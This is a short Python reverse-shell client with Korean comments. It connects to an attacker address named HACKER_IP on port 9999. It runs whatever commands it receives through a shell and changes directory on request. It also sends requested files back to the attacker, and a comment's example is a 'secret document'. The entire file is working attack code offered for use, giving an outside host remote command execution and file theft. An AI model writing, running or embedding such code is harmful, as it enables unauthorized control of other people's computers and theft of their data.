import socket
import subprocess
import os # <-- 파일 시스템을 직접 제어하기 위해 추가

HACKER_IP = #ip 입력 
HACKER_PORT = 9999

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((HACKER_IP, HACKER_PORT))
    
    while True:
        command = s.recv(1024).decode('cp949', errors='ignore')
        
        if command == 'exit':
            break
            
        # [핵심 추가 기능] CD 명령어 처리
        # 명령어가 'cd'로 시작하면(예: cd ..) subprocess가 아니라 os가 직접 움직임
        if command[:2] == 'cd':
            try:
                # cd 뒤에 있는 경로를 읽어서 이동
                os.chdir(command[3:].strip())
                result = f"이동 완료: {os.getcwd()}\n".encode('cp949')
            except Exception as e:
                result = f"이동 실패: {e}\n".encode('cp949')
        # [2] 파일 다운로드 기능 (NEW!)
        # 해커가 "download 비밀문서.txt" 라고 입력하면 실행됨
        elif command[:8] == 'download':
            filename = command[9:].strip()
            if os.path.exists(filename):
                # 파일을 'rb'(Read Binary) 모드로 읽어서 원본 그대로 전송
                with open(filename, 'rb') as f:
                    file_data = f.read()
                result = file_data 
            else:
                result = "파일이 없습니다.".encode('cp949')
        # 나머지 일반 명령어는 그대로 subprocess가 처리
        else:
            output = subprocess.run(command, shell=True, capture_output=True)
            result = output.stdout + output.stderr
            if not result:
                result = b"Command Executed.\n"
            
        s.send(result)
        
except Exception as e:
    pass
finally:
    s.close()